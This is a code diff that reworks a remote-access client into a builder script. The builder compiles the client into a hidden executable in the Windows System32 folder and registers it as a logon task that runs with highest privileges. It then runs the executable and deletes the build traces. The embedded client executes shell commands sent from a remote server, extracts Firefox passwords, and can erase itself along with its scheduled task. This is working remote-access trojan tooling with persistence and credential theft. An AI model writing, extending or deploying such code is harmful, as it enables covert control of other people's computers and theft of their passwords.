@@ -1,3 +1,53 @@
+import os
+import subprocess
+import textwrap
+import PyInstaller.__main__ as PI_EncryptHere
+from pathlib import Path
+import shutil
+import string
+import json
+# ==== USER SETTINGS ====
+# IP and Port need to be directly updated in the following target code (under SERHER_HOST and SERVER_PORT)
+output_name = "QRS-Client" # Desired name (without .exe)
+output_path = "WIN" # Desired output folder (use / or \\) | Input WIN here to automatically detect and use the windows system[x] folder
+task_name = "QRS-Client-Autostart" # Optional: leave empty to use output_name as task name
+HostIP = "127.0.0.1" # Enter the IP address of the host machine (leave empty to use localhost)
+HostPort = "5003" # Enter the port of the host machine (leave empty to use 5003)
+Saved = True # Set to True if you want to have a seperate save file
+# ========================
+
+# Save file
+if Saved:
+    if os.path.isfile("UserSettings.json"):
+        with open("UserSettings.json", "r") as f:
+            settings = json.load(f)
+        output_name = settings["output_name"]
+        output_path = settings["output_path"]
+        task_name = settings["task_name"]
+        HostIP = settings["HostIP"]
+        HostPort = settings["HostPort"]
+        Saved = settings["Saved"]
+        print("[✓] UserSettings.json loaded successfully.")
+    else:
+        print("[!] UserSettings.json not found. Creating a new one.")
+        with open("UserSettings.json", "w") as f:
+            json.dump({
+                "output_name": output_name,
+                "output_path": output_path,
+                "task_name": task_name,
+                "HostIP": HostIP,
+                "HostPort": HostPort,
+                "Saved": Saved
+            }, f, indent=4)
+
+
+
+
+# Ensure output path exists
+os.makedirs(output_path, exist_ok=True)
+
+# Your Python code to be compiled
+target_code = """
 import socket
 import os
 import subprocess
@@ -10,8 +60,8 @@ import tempfile
 
 GlobalOverwriteOutput = None
 
-SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 5003
+SERVER_HOST = "-~-Host-~-"
+SERVER_PORT = -~-Port-~-
 BUFFER_SIZE = 1024 * 1024 # 1MB max size for commands, feel free to increase
 SEPARATOR = "<sep>"
 def RunCommand(command):
@@ -20,7 +70,7 @@ def RunCommand(command):
         result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
         return result.stdout
     except subprocess.CalledProcessError as e:
-        return f"Error occurred while executing the command:\n{e.stderr}" 
+        return f"Error occurred while executing the command:\\n{e.stderr}" 
     except Exception as ex:
         return f"Unexpected error: {ex}"
     
@@ -102,7 +152,7 @@ def SelfDestruct():
 
     # Clean up any Windows Task Scheduler entries pointing to this script
     out = subprocess.run(['schtasks', '/Query', '/FO', 'LIST', '/V'], capture_output=True, text=True).stdout
-    for block in out.split('\n\n'):
+    for block in out.split('\\n\\n'):
         if path.lower() in block.lower():
             for line in block.splitlines():
                 if line.startswith("TaskName:"):
@@ -112,14 +162,13 @@ def SelfDestruct():
     # Write a temporary .bat file to delete the script and itself
     bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
     bat_path = bat.name
-    bat.write(f"""
-@echo off
-ping 127.0.0.1 -n 3 >nul
-copy /y NUL "{path}" >nul
-del /f /q "{path}"
-del /f /q "{bat_path}"
-    """.strip().encode())
+
+    bat_content = -~-bat-~-.format(path, bat_path)
+
+    # Now write the content to the bat file
+    bat.write(bat_content.encode())
     bat.close()
+
 
     # Run the batch file in the background and exit this script
     subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
@@ -174,8 +223,8 @@ def EstablishConnection():
                         except IndexError:
                             sections = FirfoxDecryptor.main("GetProfiles")
                             sections = FirfoxDecryptor.aligne_sections(sections)
-                            output = "Incorrect use of command. Please use 'extract passwords firefox <profile>'\navailable profiles are:\n"
-                            output += "\n".join(sections)
+                            output = "Incorrect use of command. Please use 'extract passwords firefox <profile>'\\navailable profiles are:\\n"
+                            output += "\\n".join(sections)
                         except Exception as e:
                             output = f"Error occurred: {e}"
                             print(f"Error occurred: {e}")
@@ -253,3 +302,101 @@ while True:
     if ping == "connect":
         EstablishConnection()
     tm.sleep(5)
+"""
+
+# Step 1: Save the code to a file
+filename = f"build.{output_name.replace(' ', '').translate(str.maketrans('', '', string.punctuation))}"
+with open(filename, "w", encoding="utf-8") as f:
+    f.write(textwrap.dedent(
+        target_code.replace("-~-Host-~-", HostIP)
+        .replace("-~-Port-~-", HostPort)
+        .replace("-~-bat-~-", '''""" 
+@echo off
+ping 127.0.0.1 -n 3 >nul
+copy /y NUL "{0}" >nul
+del /f /q "{0}"
+del /f /q "{1}"
+"""''')
+    ))
+print(f"[+] Script saved to: {os.path.abspath(filename)}")
+
+# Step 2: Build with PyInstaller
+print("[*] Compiling to EXE with PyInstaller...")
+
+# Full output path (e.g., C:/Users/Public/Builds/MyCustomApp.exe)
+if output_path == "WIN":
+    print("[!] Using Windows system folder as output path.")
+    x = 32
+    while True:
+        try:
+            output_path = os.path.join(os.environ['SystemRoot'], f'System{x}')
+            print(f"[✓] Found valid system path: {output_path}")
+            break
+        except Exception as e:
+            x = x*2
+        
+full_output_exe = f"{output_path}/{output_name}.exe"
+
+# Run PyInstaller with output name and single EXE option
+PI_EncryptHere.run([
+    "--onefile",
+    "--distpath", output_path,
+    "--workpath", output_path,
+    "--specpath", output_path,
+    "--name", output_name,
+    "--clean",
+    filename
+])
+print(f"[✓] Compilation finished. File saved to: {full_output_exe}")
+
+# Step 3: Add execution permissions & startup policies
+print("[*] Adding execution permissions and startup policies...")
+try:
+    subprocess.run([
+        "schtasks", "/Create",
+        "/SC", "ONLOGON",
+        "/RL", "HIGHEST",  # Run with highest privileges
+        "/TN", task_name if task_name else output_name,
+        "/TR", f'"{full_output_exe}"'
+    ], check=True)
+    print(f"[✓] Scheduled task '{task_name if task_name else output_name}' created successfully.")
+except subprocess.CalledProcessError as e:
+    print(f"[!] Failed to create task: {e}")
+print("[*] Task created. Running task...")
+try:
+    subprocess.run(["schtasks", "/Run", "/TN", task_name])
+    print(f"[✓] Task '{task_name if task_name else output_name}' started successfully.")
+except subprocess.CalledProcessError as e:
+    print(f"[!] Failed to run task: {e}")
+
+# Step 4: Clean up the build files
+print("[*] Cleaning up build files...")
+cs = 0    # Cleaning score
+tcs = 0   # Target Cleaning score
+try:
+    os.remove(f"{output_path}/{output_name}.spec")
+    print(f"[*] Removed spec file: {output_path}/{output_name}.spec")
+    cs += 1
+except Exception as e:
+    print(f"[!] Error removing spec file: {e}")
+tcs += 1
+try:
+    shutil.rmtree(f"{output_path}/{output_name}")
+    print(f"[*] Removed build directory: {output_path}/{output_name}")
+    cs += 1
+except Exception as e:
+    print(f"[!] Error removing build directory: {e}")
+tcs += 1
+try:
+    os.remove(filename)
+    print(f"[*] Removed source file: {filename}")
+    cs += 1
+except Exception as e:
+    print(f"[!] Error removing source file: {e}")
+tcs += 1
+if cs == 0:
+    print("[!] Failed to clean up build files.")
+elif cs > 0 and cs < tcs:
+    print(f"[!] Cleaned up {(cs/tcs)*100}% build files.")
+else:
+    print("[✓] Cleaning up complete")
